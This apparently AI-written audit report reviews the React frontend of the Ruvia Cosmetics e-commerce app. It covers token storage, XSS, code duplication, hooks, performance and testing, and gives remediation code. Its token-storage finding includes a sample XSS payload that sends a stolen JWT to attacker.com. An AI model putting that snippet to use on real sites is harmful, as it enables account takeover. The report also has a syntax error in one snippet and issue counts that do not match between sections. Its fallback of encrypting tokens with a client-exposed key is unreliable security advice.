# Phase 3: Frontend Code Quality & React Best Practices Audit
## Ruvia Cosmetics MERN Stack E-Commerce Application

**Audit Date:** 2026-05-22  
**Auditor:** Cascade AI Assistant (React/Next.js Expert)  
**Scope:** React frontend code quality, maintainability, performance, and security

---

## Executive Summary

**Overall Code Quality Rating:** 🟡 **MODERATE - NEEDS IMPROVEMENT**

This audit revealed **2 critical security vulnerabilities**, **8 high-risk code quality issues**, and **6 performance concerns**. The frontend uses modern React patterns but suffers from security vulnerabilities, code duplication, and monolithic components.

**Immediate Action Required:** Fix localStorage token storage vulnerability before production deployment.

---

## 1. Security Analysis

### 1.1 JWT Token Storage

#### 🔴 **CRITICAL VULNERABILITY #1: JWT Tokens Stored in LocalStorage**

**Locations:** Multiple files
- `context/AuthContext.js:47, 73, 115, 129, 153, 168`
- `context/AdminContext.js:19, 28, 44, 48, 53, 76, 92`
- `context/CartContext.js:16, 26, 33, 55, 135`
- `context/WishlistContext.js:14, 29`

**Vulnerable Code:**
```javascript
// AuthContext.js:47
const storedUser = localStorage.getItem("ruvia_user");

// AuthContext.js:73
localStorage.setItem("ruvia_user", JSON.stringify(nextUser));

// AuthContext.js:129
localStorage.setItem("ruvia_user", JSON.stringify(normalizeUser(data)));

// AdminContext.js:19
const storedAdmin = localStorage.getItem("ruvia_admin");

// AdminContext.js:76
localStorage.setItem("ruvia_admin", JSON.stringify(data));
```

**Attack Scenario:**
1. Attacker injects malicious JavaScript via XSS vulnerability (e.g., through user-generated content, third-party scripts, or compromised CDN)
2. Malicious script accesses `localStorage.getItem("ruvia_user")`
3. Attacker steals JWT token
4. Attacker uses stolen token to authenticate as the user
5. Attacker can access user's account, place orders, view personal information

**Example Attack Code:**
```javascript
// Malicious script injected via XSS
const stolenToken = localStorage.getItem("ruvia_user");
// Send to attacker's server
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token: stolenToken })
});
```

**Impact:** Complete account takeover, unauthorized access to user data, fraudulent orders.

**Fix:**
Use HTTP-only cookies with Secure flag for JWT token storage:

```javascript
// Backend: Set HTTP-only cookie
res.cookie('token', token, {
  httpOnly: true,  // JavaScript cannot access
  secure: true,    // Only sent over HTTPS
  sameSite: 'strict',
  maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days
});

// Frontend: Remove localStorage usage
// Token is automatically sent with requests via cookie
// No manual token management needed
```

**Alternative Fix (if cookies not possible):**
Use a more secure storage mechanism with additional protections:
```javascript
// Use a library like js-cookie with additional encryption
import Cookies from 'js-cookie';
import CryptoJS from 'crypto-js';

const SECRET_KEY = process.env.NEXT_PUBLIC_ENCRYPTION_KEY;

const encryptToken = (token) => {
  return CryptoJS.AES.encrypt(token, SECRET_KEY).toString();
};

const decryptToken = (encrypted) => {
  const bytes = CryptoJS.AES.decrypt(encrypted, SECRET_KEY);
  return bytes.toString(CryptoJS.enc.Utf8);
};

// Store encrypted token
Cookies.set('ruvia_token', encryptToken(token), { 
  secure: true, 
  sameSite: 'strict' 
});
```

---

#### 🔴 **CRITICAL VULNERABILITY #2: Admin Tokens Also Stored in LocalStorage**

**Location:** `context/AdminContext.js`

**Vulnerable Code:**
```javascript
// AdminContext.js:19
const storedAdmin = localStorage.getItem("ruvia_admin");

// AdminContext.js:76
localStorage.setItem("ruvia_admin", JSON.stringify(data));
```

**Attack Scenario:**
Same as above, but attacker gains admin privileges, allowing:
- Product manipulation
- Order access/modification
- User data access
- Complete system compromise

**Impact:** Complete system compromise, admin privilege escalation.

**Fix:** Same as Vulnerability #1 - use HTTP-only cookies.

---

### 1.2 XSS Vulnerability Assessment

#### ✅ **GOOD: No dangerouslySetInnerHTML Usage**

**Search Result:** No instances of `dangerouslySetInnerHTML` found in the codebase.

**Assessment:** This is a good security practice. The application is not explicitly rendering raw HTML, which reduces XSS attack surface.

---

#### 🟡 **HIGH RISK #1: User-Generated Content Not Sanitized**

**Potential Risk:** While no `dangerouslySetInnerHTML` is used, the application displays:
- Product descriptions (from database)
- User reviews
- User addresses

If backend doesn't sanitize these, they could contain malicious scripts.

**Recommendation:** Ensure all user-generated content is sanitized on the backend before storage. Consider using DOMPurify on the frontend for additional protection.

```javascript
import DOMPurify from 'dompurify';

// Sanitize user content before rendering
const cleanDescription = DOMPurify.sanitize(product.description);
```

---

## 2. Code Redundancy (DRY Violations)

### 2.1 Repeated localStorage Access Patterns

#### 🟡 **HIGH RISK #2: localStorage Token Retrieval Repeated Across Files**

**Locations:** 20+ instances across multiple files

**Redundant Pattern:**
```javascript
// Repeated in AuthContext.js, AdminContext.js, CartContext.js, and multiple admin pages
const storedUser = localStorage.getItem("ruvia_user");
const token = storedUser ? JSON.parse(storedUser).token : null;

// Repeated in AdminContext.js and all admin pages
const storedAdmin = localStorage.getItem("ruvia_admin");
const token = storedAdmin ? JSON.parse(storedAdmin).token : null;
```

**Files Affected:**
- `context/AuthContext.js` (6 instances)
- `context/AdminContext.js` (6 instances)
- `context/CartContext.js` (5 instances)
- `app/admin/reviews/page.js` (2 instances)
- `app/admin/dashboard/page.js` (1 instance)
- `app/admin/products/page.js` (2 instances)
- `app/admin/returns/page.js` (2 instances)

**Fix:** Create a custom hook for token management:

```javascript
// hooks/useAuthToken.js
import { useState, useEffect } from 'react';

export const useAuthToken = (key = 'ruvia_user') => {
  const [token, setToken] = useState(null);
  const [user, setUser] = useState(null);

  useEffect(() => {
    try {
      const stored = localStorage.getItem(key);
      if (stored) {
        const parsed = JSON.parse(stored);
        setToken(parsed.token);
        setUser(parsed);
      }
    } catch (e) {
      console.error(`Failed to load ${key}`, e);
    }
  }, [key]);

  const updateToken = (data) => {
    localStorage.setItem(key, JSON.stringify(data));
    setToken(data.token);
    setUser(data);
  };

  const clearToken = () => {
    localStorage.removeItem(key);
    setToken(null);
    setUser(null);
  };

  return { token, user, updateToken, clearToken };
};

// Usage in components
const { token, user, updateToken, clearToken } = useAuthToken('ruvia_user');
```

---

### 2.2 Repeated API Fetch Patterns

#### 🟡 **HIGH RISK #3: No Centralized API Client**

**Current Pattern:** Each component implements its own fetch logic

**Examples:**
```javascript
// AuthContext.js:33-42
const response = await fetch(apiUrl("/api/auth/me"), {
  headers: { Authorization: `Bearer ${token}` }
});

// CartContext.js:37-44
fetch(apiUrl("/api/cart"), {
  method: "POST",
  headers: {
    "Content-Type": "application/json",
    Authorization: `Bearer ${user.token}`,
  },
  body: JSON.stringify({ items: cartItems }),
})

// shop/page.js:25-27
const res = await fetch(apiUrl("/api/products"));
const data = await res.json();
```

**Issues:**
- No error handling consistency
- No request/response interceptors
- No automatic token injection
- No retry logic
- No request timeout
- No loading state management

**Fix:** Create a centralized API client:

```javascript
// lib/apiClient.js
import { apiUrl } from '../constants';

class ApiClient {
  constructor() {
    this.baseURL = apiUrl('');
    this.token = null;
  }

  setToken(token) {
    this.token = token;
  }

  getHeaders() {
    const headers = {
      'Content-Type': 'application/json',
    };
    
    if (this.token) {
      headers['Authorization'] = `Bearer ${this.token}`;
    }
    
    return headers;
  }

  async request(endpoint, options = {}) {
    const url = `${this.baseURL}${endpoint}`;
    const config = {
      ...options,
      headers: {
        ...this.getHeaders(),
        ...options.headers,
      },
    };

    try {
      const response = await fetch(url, config);
      
      if (!response.ok) {
        const error = await response.json().catch(() => ({ message: 'Request failed' }));
        throw new Error(error.message || `HTTP ${response.status}`);
      }

      return await response.json();
    } catch (error) {
      console.error('API request failed:', error);
      throw error;
    }
  }

  get(endpoint) {
    return this.request(endpoint, { method: 'GET' });
  }

  post(endpoint, data) {
    return this.request(endpoint, {
      method: 'POST',
      body: JSON.stringify(data),
    });
  }

  put(endpoint, data) {
    return this.request(endpoint, {
      method: 'PUT',
      body: JSON.stringify(data),
    });
  }

  delete(endpoint) {
    return this.request(endpoint, { method: 'DELETE' });
  }
}

export const apiClient = new ApiClient();
```

---

### 2.3 Repeated Component Logic

#### 🟡 **HIGH RISK #4: Similar Product Card Logic in Multiple Places**

**Locations:**
- `app/page.js` (product slider)
- `app/shop/page.js` (product grid)
- Potentially other pages

**Redundant Pattern:**
```javascript
// Repeated product rendering logic
<div className="product-card">
  <img src={product.image} alt={product.name} />
  <h3>{product.name}</h3>
  <p>₹{product.price}</p>
  <button onClick={() => addToCart(product)}>Add to Cart</button>
</div>
```

**Fix:** Create a reusable ProductCard component:

```javascript
// components/ProductCard.jsx
import { useCart } from '../context/CartContext';
import { useWishlist } from '../context/WishlistContext';
import { Heart, ShoppingBag, Star } from 'lucide-react';

export default function ProductCard({ product, variant = 'default' }) {
  const { addToCart } = useCart();
  const { toggleWishlist, isInWishlist } = useWishlist();

  const handleAddToCart = () => {
    addToCart({ ...product, quantity: 1 });
  };

  const handleToggleWishlist = () => {
    toggleWishlist(product);
  };

  if (variant === 'compact') {
    return (
      <div className="product-card-compact">
        {/* Compact variant */}
      </div>
    );
  }

  return (
    <div className="product-card">
      <div className="product-image">
        <img src={product.image} alt={product.name} />
        <button 
          onClick={handleToggleWishlist}
          className={`wishlist-btn ${isInWishlist(product.id) ? 'active' : ''}`}
        >
          <Heart size={18} />
        </button>
      </div>
      <div className="product-info">
        <h3>{product.name}</h3>
        <div className="rating">
          {[...Array(5)].map((_, i) => (
            <Star key={i} size={10} className={i < Math.floor(product.rating) ? "filled" : ""} />
          ))}
        </div>
        <p className="price">₹{product.price.toLocaleString('en-IN')}</p>
        <button onClick={handleAddToCart}>
          <ShoppingBag size={12} />
          Add to Bag
        </button>
      </div>
    </div>
  );
}
```

---

## 3. Component Size & Monolithic Issues

### 3.1 Monolithic Components

#### 🔴 **CRITICAL CODE QUALITY #1: Homepage Component is Too Large**

**Location:** `app/page.js`

**Size:** 725 lines

**Issues:**
- Single component handles hero, offers, product slider, testimonials, FAQ, and more
- Multiple state hooks (8+ useState)
- Multiple useEffect hooks (3+)
- Hard to test
- Hard to maintain
- Poor reusability
- Performance concerns (entire component re-renders on any state change)

**Current Structure:**
```javascript
export default function Home() {
  // 8+ state variables
  const [activeStep, setActiveStep] = useState(0);
  const [activeFaq, setActiveFaq] = useState(0);
  const [canScrollPrev, setCanScrollPrev] = useState(false);
  const [canScrollNext, setCanScrollNext] = useState(true);
  const [showStickyCta, setShowStickyCta] useState(false);
  // ... more state

  // 3+ useEffect hooks
  useEffect(() => { /* scroll check */ }, []);
  useEffect(() => { /* sticky CTA */ }, []);
  useEffect(() => { /* GSAP animations */ }, []);

  // 700+ lines of JSX
  return (
    <div>
      <HeroSection />
      <OffersSection />
      <ProductSlider />
      <TestimonialsSection />
      {/* ... more sections */}
    </div>
  );
}
```

**Fix:** Break down into smaller components:

```javascript
// app/page.js
import HeroSection from '../components/home/HeroSection';
import OffersSection from '../components/home/OffersSection';
import ProductSlider from '../components/home/ProductSlider';
import TestimonialsSection from '../components/home/TestimonialsSection';
import RitualSection from '../components/home/RitualSection';
import LaboratorySection from '../components/home/LaboratorySection';
import FounderSection from '../components/home/FounderSection';
import SustainabilitySection from '../components/home/SustainabilitySection';
import FAQSection from '../components/home/FAQSection';

export default function Home() {
  return (
    <div>
      <HeroSection />
      <OffersSection />
      <ProductSlider />
      <TestimonialsSection />
      <RitualSection />
      <LaboratorySection />
      <FounderSection />
      <SustainabilitySection />
      <FAQSection />
    </div>
  );
}

// components/home/HeroSection.jsx
export default function HeroSection() {
  const { addToCart } = useCart();

  const handleAddToCart = (product, e) => {
    if (e) e.preventDefault();
    addToCart(product);
  };

  return (
    <section className="hero-section">
      {/* Hero content */}
    </section>
  );
}
```

---

#### 🟡 **HIGH RISK #5: Header Component is Large**

**Location:** `components/layout/Header.jsx`

**Size:** 331 lines

**Issues:**
- Handles navigation, search, mobile menu, cart count, wishlist count
- Multiple state variables (6+)
- Multiple useEffect hooks (3+)
- Complex conditional rendering

**Fix:** Break down into smaller components:

```javascript
// components/layout/Header.jsx
import Navigation from './Navigation';
import SearchOverlay from './SearchOverlay';
import MobileMenu from './MobileMenu';
import CartButton from './CartButton';
import WishlistButton from './WishlistButton';

export default function Header() {
  const [isScrolled, setIsScrolled] = useState(false);
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const [searchOpen, setSearchOpen] = useState(false);

  return (
    <>
      <header>
        <Navigation isScrolled={isScrolled} />
        <div className="icons">
          <SearchButton onOpen={() => setSearchOpen(true)} />
          <WishlistButton />
          <CartButton />
          <MobileMenuButton onOpen={() => setMobileMenuOpen(true)} />
        </div>
      </header>
      <SearchOverlay isOpen={searchOpen} onClose={() => setSearchOpen(false)} />
      <MobileMenu isOpen={mobileMenuOpen} onClose={() => setMobileMenuOpen(false)} />
    </>
  );
}
```

---

#### 🟡 **HIGH RISK #6: Shop Page Component is Large**

**Location:** `app/shop/page.js`

**Size:** 358 lines

**Issues:**
- Handles product fetching, filtering, sorting, and display
- Multiple state variables (7+)
- Complex filtering logic
- Large component

**Fix:** Extract filtering logic and product grid:

```javascript
// app/shop/page.js
import ProductGrid from '../components/shop/ProductGrid';
import ProductFilters from '../components/shop/ProductFilters';
import HeroSlider from '../components/shop/HeroSlider';
import { useProducts } from '../hooks/useProducts';

export default function ShopPage() {
  const { products, loading } = useProducts();
  const [filters, setFilters] = useState({
    search: '',
    category: 'All',
    concern: 'All',
    sortBy: 'Featured'
  });

  const filteredProducts = useFilteredProducts(products, filters);

  return (
    <div>
      <HeroSlider products={products} />
      <ProductFilters filters={filters} onFilterChange={setFilters} />
      <ProductGrid products={filteredProducts} />
    </div>
  );
}

// hooks/useFilteredProducts.js
export const useFilteredProducts = (products, filters) => {
  return useMemo(() => {
    let result = products.filter(p => {
      const matchesSearch = p.name.toLowerCase().includes(filters.search.toLowerCase());
      const matchesCategory = filters.category === "All" || p.category === filters.category;
      const matchesConcern = filters.concern === "All" || p.concern === filters.concern;
      return matchesSearch && matchesCategory && matchesConcern;
    });

    if (filters.sortBy === "Price: Low to High") result.sort((a, b) => a.price - b.price);
    if (filters.sortBy === "Price: High to Low") result.sort((a, b) => b.price - a.price);
    if (filters.sortBy === "Top Rated") result.sort((a, b) => b.rating - a.rating);

    return result;
  }, [products, filters]);
};
```

---

## 4. useEffect Hook Analysis

### 4.1 Memory Leaks & Cleanup

#### ✅ **GOOD: Proper Cleanup in Most useEffect Hooks**

**Examples:**
```javascript
// Header.jsx:32-38
useEffect(() => {
  const handleScroll = () => {
    setIsScrolled(window.scrollY > 50);
  };
  window.addEventListener("scroll", handleScroll);
  return () => window.removeEventListener("scroll", handleScroll); // ✅ Good cleanup
}, []);

// page.js:51-57
useEffect(() => {
  const handleScroll = () => {
    setShowStickyCta(window.scrollY > window.innerHeight * 0.8);
  };
  window.addEventListener('scroll', handleScroll, { passive: true });
  return () => window.removeEventListener('scroll', handleScroll); // ✅ Good cleanup
}, []);
```

**Assessment:** Most event listeners are properly cleaned up.

---

#### 🟡 **HIGH RISK #7: Potential Memory Leak in CartContext**

**Location:** `context/CartContext.js:24-49`

**Issue:**
```javascript
useEffect(() => {
  try {
    localStorage.setItem("ruvia_cart", JSON.stringify(cartItems));
  } catch (e) {
    console.error("Failed to save cart", e);
  }
  if (syncRef.current) clearTimeout(syncRef.current);
  syncRef.current = setTimeout(() => {
    // Server sync logic
  }, 800);
}, [cartItems]); // ❌ No cleanup for timeout
```

**Problem:** If component unmounts before timeout fires, the timeout will still execute, potentially causing errors.

**Fix:**
```javascript
useEffect(() => {
  try {
    localStorage.setItem("ruvia_cart", JSON.stringify(cartItems));
  } catch (e) {
    console.error("Failed to save cart", e);
  }
  
  if (syncRef.current) clearTimeout(syncRef.current);
  syncRef.current = setTimeout(() => {
    if (typeof window !== "undefined") {
      const storedUser = localStorage.getItem("ruvia_user");
      if (storedUser) {
        const user = JSON.parse(storedUser);
        if (user && user.token) {
          fetch(apiUrl("/api/cart"), {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              Authorization: `Bearer ${user.token}`,
            },
            body: JSON.stringify({ items: cartItems }),
          }).catch((err) => console.error("Cart sync failed:", err));
        }
      }
    }
  }, 800);

  return () => {
    if (syncRef.current) clearTimeout(syncRef.current); // ✅ Add cleanup
  };
}, [cartItems]);
```

---

### 4.2 Infinite Loop Prevention

#### ✅ **GOOD: Proper Dependency Arrays**

**Assessment:** Most useEffect hooks have proper dependency arrays.

**Examples:**
```javascript
// shop/page.js:47-53
useEffect(() => {
  if (!slides.length) return;
  const timer = setInterval(() => {
    setCurrentSlide((prev) => (prev + 1) % slides.length);
  }, 5000);
  return () => clearInterval(timer);
}, [slides.length]); // ✅ Correct dependency
```

---

#### 🟡 **HIGH RISK #8: ESLint Disable Used Unnecessarily**

**Location:** `context/CartContext.js:84`

**Issue:**
```javascript
useEffect(() => {
  const trySyncFromServer = async () => {
    // ... sync logic
  };
  trySyncFromServer();
  // eslint-disable-next-line react-hooks/exhaustive-deps
}, []); // ❌ Disabling ESLint warning
```

**Problem:** ESLint disable suggests missing dependencies. This could lead to stale closures.

**Fix:** Either add the missing dependencies or use useCallback:

```javascript
const trySyncFromServer = useCallback(async () => {
  try {
    const storedUser = localStorage.getItem("ruvia_user");
    if (!storedUser) return;
    const user = JSON.parse(storedUser);
    if (!user || !user.token) return;

    const res = await fetch(apiUrl("/api/cart"), {
      method: "GET",
      headers: {
        Authorization: `Bearer ${user.token}`,
      },
    });
    if (!res.ok) return;
    const data = await res.json();
    if (data && Array.isArray(data.items)) {
      const merged = [...cartItems];
      data.items.forEach((si) => {
        const idx = merged.findIndex((li) => li.id === si.id);
        if (idx === -1) merged.push(si);
        else merged[idx] = { ...merged[idx], quantity: si.qty || si.quantity || merged[idx].quantity };
      });
      setCartItems(merged);
    }
  } catch (err) {
    console.error("Failed to load server cart", err);
  }
}, [cartItems]); // Add dependency

useEffect(() => {
  trySyncFromServer();
}, [trySyncFromServer]); // Use callback
```

---

## 5. Performance Analysis

### 5.1 Rendering Performance

#### 🟡 **HIGH RISK #9: No React.memo for Product Cards**

**Location:** `app/shop/page.js:187-263`

**Issue:**
```javascript
{filteredProducts.map((product) => (
  <div key={product.id} className="group flex flex-col h-full">
    {/* Product card JSX */}
  </div>
))}
```

**Problem:** Every state change in parent component causes all product cards to re-render, even if they haven't changed.

**Fix:** Use React.memo for ProductCard component:

```javascript
// components/ProductCard.jsx
import React from 'react';

const ProductCard = React.memo(function ProductCard({ product }) {
  // Component logic
});

export default ProductCard;
```

---

#### 🟡 **HIGH RISK #10: No useMemo for Expensive Calculations**

**Location:** `app/shop/page.js:58-71`

**Current Code:**
```javascript
const filteredProducts = useMemo(() => {
  let result = products.filter(p => {
    const matchesSearch = p.name.toLowerCase().includes(searchQuery.toLowerCase());
    const matchesCategory = selectedCategory === "All" || p.category === selectedCategory;
    const matchesConcern = selectedConcern === "All" || p.concern === selectedConcern;
    return matchesSearch && matchesCategory && matchesConcern;
  });

  if (sortBy === "Price: Low to High") result.sort((a, b) => a.price - b.price);
  if (sortBy === "Price: High to Low") result.sort((a, b) => b.price - a.price);
  if (sortBy === "Top Rated") result.sort((a, b) => b.rating - a.rating);

  return result;
}, [products, searchQuery, selectedCategory, selectedConcern, sortBy]); // ✅ Already using useMemo
```

**Assessment:** This is actually good - useMemo is already being used.

---

#### 🟡 **HIGH RISK #11: No Lazy Loading for Images**

**Location:** Multiple components

**Issue:** Images are loaded eagerly, which can slow down initial page load.

**Fix:** Use Next.js Image component with lazy loading:

```javascript
import Image from 'next/image';

<Image 
  src={product.image} 
  alt={product.name}
  width={400}
  height={400}
  loading="lazy"
  placeholder="blur"
  blurDataURL="data:image/jpeg;base64,/9j/4AAQSkZJRg..."
/>
```

---

### 5.2 Bundle Size

#### 🟡 **HIGH RISK #12: GSAP Loaded on Every Page**

**Location:** `app/page.js:4`

**Issue:**
```javascript
import { gsap } from "gsap";
import { ScrollTrigger } from "gsap/ScrollTrigger";
```

**Problem:** GSAP is a large library (~100KB) but only used on the homepage.

**Fix:** Dynamic import GSAP only on homepage:

```javascript
// app/page.js
import dynamic from 'next/dynamic';

const AnimatedSection = dynamic(() => import('../components/AnimatedSection'), {
  loading: () => <div>Loading...</div>,
  ssr: false
});
```

---

## 6. State Management Analysis

### 6.1 Context API Usage

#### ✅ **GOOD: Proper Context API Implementation**

**Assessment:** Context API is used appropriately for:
- Authentication (AuthContext)
- Shopping cart (CartContext)
- Wishlist (WishlistContext)
- Admin (AdminContext)

**Strengths:**
- Custom hooks for accessing context
- Proper provider wrapping
- Clear separation of concerns

---

#### 🟡 **HIGH RISK #13: Context Not Optimized with useMemo**

**Location:** All context files

**Issue:**
```javascript
// AuthContext.js:246-257
const value = {
  user,
  login,
  signup,
  logout,
  updateUser,
  loading,
  addresses,
  addAddress,
  updateAddress,
  deleteAddress
};

return <AuthContext.Provider value={value}>{!loading && children}</AuthContext.Provider>;
```

**Problem:** The value object is recreated on every render, causing all consumers to re-render even if they only use a subset of the values.

**Fix:** Use useMemo for context value:

```javascript
const value = useMemo(() => ({
  user,
  login,
  signup,
  logout,
  updateUser,
  loading,
  addresses,
  addAddress,
  updateAddress,
  deleteAddress
}), [user, loading, addresses, login, signup, logout, updateUser, addAddress, updateAddress, deleteAddress]);

return <AuthContext.Provider value={value}>{!loading && children}</AuthContext.Provider>;
```

---

## 7. Error Handling

### 7.1 API Error Handling

#### 🟡 **HIGH RISK #14: Inconsistent Error Handling**

**Current Patterns:**
```javascript
// Some places use try-catch
try {
  const res = await fetch(apiUrl("/api/products"));
  const data = await res.json();
  setProducts(data);
} catch (error) {
  console.error("Failed to fetch products", error);
}

// Some places don't
const res = await fetch(apiUrl("/api/products"));
const data = await res.json();
setProducts(data);
```

**Problem:** No consistent error handling strategy. Users don't see error messages.

**Fix:** Implement global error boundary and consistent error handling:

```javascript
// components/ErrorBoundary.jsx
import React from 'react';

class ErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    console.error('Error caught by boundary:', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="error-fallback">
          <h2>Something went wrong</h2>
          <p>{this.state.error?.message}</p>
          <button onClick={() => window.location.reload()}>Reload Page</button>
        </div>
      );
    }

    return this.props.children;
  }
}

export default ErrorBoundary;

// app/layout.js
import ErrorBoundary from '../components/ErrorBoundary';

export default function RootLayout({ children }) {
  return (
    <html>
      <body>
        <ErrorBoundary>
          <AuthProvider>
            {children}
          </AuthProvider>
        </ErrorBoundary>
      </body>
    </html>
  );
}
```

---

## 8. TypeScript Usage

#### 🟡 **HIGH RISK #15: TypeScript Not Fully Utilized**

**Observation:** While TypeScript is configured, many components don't have proper type definitions.

**Example:**
```javascript
// No type definitions for props
export default function ProductCard({ product }) {
  // component logic
}
```

**Fix:** Add proper TypeScript types:

```typescript
interface Product {
  id: string;
  name: string;
  price: number;
  image: string;
  category: string;
  rating: number;
  reviews: number;
}

interface ProductCardProps {
  product: Product;
  variant?: 'default' | 'compact';
}

export default function ProductCard({ product, variant = 'default' }: ProductCardProps) {
  // component logic
}
```

---

## 9. Accessibility

#### 🟡 **HIGH RISK #16: Missing ARIA Labels**

**Location:** Multiple components

**Examples:**
```javascript
// Header.jsx - No aria-labels on icon buttons
<button onClick={() => setSearchOpen(true)}>
  <Search size={18} />
</button>

// shop/page.js - No aria-labels on filter buttons
<button onClick={() => setSelectedCategory(cat)}>
  {cat}
</button>
```

**Fix:** Add ARIA labels for accessibility:

```javascript
<button 
  onClick={() => setSearchOpen(true)}
  aria-label="Open search"
>
  <Search size={18} />
</button>

<button 
  onClick={() => setSelectedCategory(cat)}
  aria-label={`Filter by ${cat}`}
  aria-pressed={selectedCategory === cat}
>
  {cat}
</button>
```

---

## 10. Testing

#### 🔴 **CRITICAL CODE QUALITY #2: No Tests Found**

**Observation:** No test files found in the codebase.

**Impact:** 
- No regression testing
- Difficult to refactor safely
- Bugs may go undetected
- Low confidence in code changes

**Fix:** Add testing infrastructure:

```javascript
// __tests__/components/ProductCard.test.jsx
import { render, screen } from '@testing-library/react';
import ProductCard from '../components/ProductCard';

describe('ProductCard', () => {
  const mockProduct = {
    id: '1',
    name: 'Test Product',
    price: 999,
    image: '/test.jpg',
    category: 'Serum',
    rating: 4.5,
    reviews: 100
  };

  it('renders product name', () => {
    render(<ProductCard product={mockProduct} />);
    expect(screen.getByText('Test Product')).toBeInTheDocument();
  });

  it('renders price correctly', () => {
    render(<ProductCard product={mockProduct} />);
    expect(screen.getByText('₹999')).toBeInTheDocument();
  });
});
```

---

## 11. Vulnerability Summary

### Critical Vulnerabilities (2) - Must Fix Immediately

1. **JWT Tokens Stored in LocalStorage** - XSS vulnerability allows token theft
2. **Admin Tokens Stored in LocalStorage** - XSS vulnerability allows admin privilege escalation

### High Risk Issues (14) - Fix Soon

1. User-generated content not sanitized
2. localStorage token retrieval repeated across 20+ files
3. No centralized API client
4. Similar product card logic in multiple places
5. Homepage component is 725 lines (monolithic)
6. Header component is 331 lines (monolithic)
7. Shop page component is 358 lines (monolithic)
8. Potential memory leak in CartContext timeout
9. ESLint disable used unnecessarily
10. No React.memo for product cards
11. No lazy loading for images
12. GSAP loaded on every page
13. Context not optimized with useMemo
14. Inconsistent error handling

### Medium Risk Issues (2) - Consider Fixing

1. TypeScript not fully utilized
2. Missing ARIA labels

### Critical Code Quality (1) - Must Fix

1. No tests found in codebase

---

## 12. Recommended Fix Priority

### Phase 1 (Critical - Fix Within 24 Hours)
1. Move JWT tokens from localStorage to HTTP-only cookies
2. Add comprehensive error boundary
3. Add basic test infrastructure

### Phase 2 (High Priority - Fix Within 1 Week)
1. Create custom hook for token management
2. Create centralized API client
3. Break down monolithic components (homepage, header, shop page)
4. Add React.memo to product cards
5. Fix memory leak in CartContext
6. Implement image lazy loading

### Phase 3 (Medium Priority - Fix Within 2 Weeks)
1. Optimize context values with useMemo
2. Add TypeScript type definitions
3. Add ARIA labels for accessibility
4. Dynamic import GSAP for homepage only
5. Create reusable ProductCard component

### Phase 4 (Enhancement - Fix Within 1 Month)
1. Add comprehensive test coverage
2. Implement performance monitoring
3. Add ESLint and Prettier configuration
4. Add Storybook for component documentation
5. Implement CI/CD pipeline with linting and testing

---

## 13. Conclusion

The Ruvia Cosmetics frontend demonstrates **good React practices** with proper Context API usage, modern hooks, and clean component structure. However, it has **critical security vulnerabilities** related to token storage that must be addressed before production deployment.

**Key Strengths:**
- Modern React patterns (hooks, Context API)
- Clean component structure
- Proper event listener cleanup
- Good use of useMemo for expensive calculations

**Key Weaknesses:**
- JWT tokens stored in localStorage (XSS vulnerability)
- Monolithic components (homepage 725 lines)
- Code duplication (localStorage access, API calls)
- No centralized API client
- No test coverage
- Missing TypeScript type definitions

**Overall Assessment:** 🟡 **MODERATE - NEEDS IMPROVEMENT**

The frontend codebase is functional and uses modern React patterns, but requires security fixes and refactoring for maintainability and performance. The critical localStorage vulnerability must be fixed before production deployment.

---

**Next Steps:** Proceed to Phase 4 - Infrastructure & DevOps Audit
